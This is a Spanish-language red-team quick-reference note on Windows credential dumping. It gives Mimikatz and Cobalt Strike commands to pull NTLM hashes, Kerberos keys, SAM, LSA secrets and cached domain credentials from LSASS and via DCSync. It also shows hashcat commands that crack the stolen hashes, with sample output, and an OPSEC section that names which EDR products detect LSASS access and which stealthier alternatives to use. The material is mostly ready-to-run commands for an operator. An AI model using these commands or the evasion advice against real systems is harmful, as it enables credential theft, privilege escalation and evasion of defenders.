---
tags: [credential-access, lsass, mimikatz, opsec]
status: done
platform: windows
---

# OS Credential Dumping

> Extracción de credenciales del sistema. Alta detección — ver notas OPSEC.

---

## LSASS / SSPI

LSASS (Local Security Authority Subsystem Service) almacena en memoria:
- Hashes NTLM
- Tickets Kerberos (TGTs y TGS)
- Credenciales en texto claro (si WDigest está activo)
- Claves de cifrado Kerberos

---

## Mimikatz (Referencia Rápida)

```
# Listar credenciales en memoria (hashes + plaintext si disponible)
mimikatz> sekurlsa::logonpasswords

# Listar solo claves Kerberos (ekeys)
mimikatz> sekurlsa::ekeys

# Dump SAM (cuentas locales)
mimikatz> lsadump::sam

# Dump secretos LSA (service accounts, cached domain creds)
mimikatz> lsadump::secrets

# Credenciales cacheadas (domain, cuando DC no accesible)
mimikatz> lsadump::cache

# DCSync — simular replicación DC (requiere permisos DS-Replication)
mimikatz> lsadump::dcsync /domain:corp.local /user:Administrator
```

### En Cobalt Strike
```
beacon> mimikatz sekurlsa::logonpasswords    # Fork & run → crea proceso
beacon> dcsync [DOMAIN\User]                 # Via BOF si disponible
```

---

## OPSEC

> ⚠️ **ALTA DETECCIÓN:**
> - `sekurlsa::logonpasswords` y `sekurlsa::ekeys` abren un handle a LSASS (OpenProcess)
> - Monitoreado por: Microsoft Defender, CrowdStrike, SentinelOne, cualquier EDR decente
> - Genera eventos: 4663 (Object Access en lsass.exe), 10 Sysmon (ProcessAccess)

**Alternativas más silenciosas:**
- **BOF-based LSASS dump** — sin fork & run, menos artefactos
- **LSASS snapshot** vía Task Manager (interactivo) — solo en labs
- **DCSync** — más sigiloso que tocar LSASS directamente (solo genera tráfico de replicación)
- Priorizar técnicas que no toquen LSASS si hay credenciales disponibles vía otros medios

---

## Referencias

- [[Kerberos Tickets]] — para dump de tickets específicamente
- Evento 4624 Logon Type 3 → tokens en memoria pero sin creds en LSASS


---

## SSPI — Mecanismos de Autenticación

Windows implementa **Security Support Provider Interface (SSPI)** con múltiples SSPs, cada uno cargado como DLL en LSASS:

| SSP | Uso |
|-----|-----|
| NTLM | Autenticación NTLM / NTLMv2 |
| Kerberos | Autenticación Kerberos v5 |
| Digest | LDAP y web |
| Schannel | TLS / SSL (claves públicas) |
| CredSSP | Terminales y servicios remotos |

---

## Cracking de Hashes

### NTLM (hashcat modo 1000)

```bash
.\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
# fc525c9683e8fe067095ba2ddc971889:Passw0rd!
```

### MS-Cache v2 — Credenciales cacheadas de dominio (hashcat modo 2100)

Las credenciales cacheadas se almacenan en formato **MS-Cache v2** en `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` (key `CachedLogonCount` controla cuántas se guardan — por defecto 10).

```bash
mimikatz> !lsadump::cache
# [NL$1] MsCacheV2 : 3566ba05cfe9d5314144ebef07289cdc
# Iteration: 10240 (por defecto)
```

```bash
# Crackear (requiere especificar iteraciones)
.\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
# $DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!
```

> [!NOTE]
> Las credenciales cacheadas NO pueden usarse para pass-the-hash — hay que crackearlas offline.

### Kerberos Keys (ekeys)

Las claves Kerberos se pueden usar para pedir tickets sin crackear contraseñas (Overpass-the-Hash):

```
mimikatz> sekurlsa::ekeys
# → des_cbc_md4: 05579261e29fb01f23b007a89596353e605ae307...
```

---

## Fuentes adicionales

### SAM (cuentas locales)

```
mimikatz> !lsadump::sam
```

Almacenado en `HKLM\sam` y `HKLM\system`. El Admin RID-500 local != Domain Administrator.

### LSA Secrets (service accounts, machine account)

```
mimikatz> !lsadump::secrets
```

Candidatos: contraseñas de cuentas de servicio, contraseña de máquina en el dominio.
Encriptados pero la clave está en `HKLM/Security/Policy`.

### DCSync (replicar DC sin acceso físico)

```
beacon> mimikatz @lsadump::dcsync /domain:CONTOSO /user:krbtgt
```

Requiere permisos de replicación de dominio (DS-Replication-Get-Changes-All).
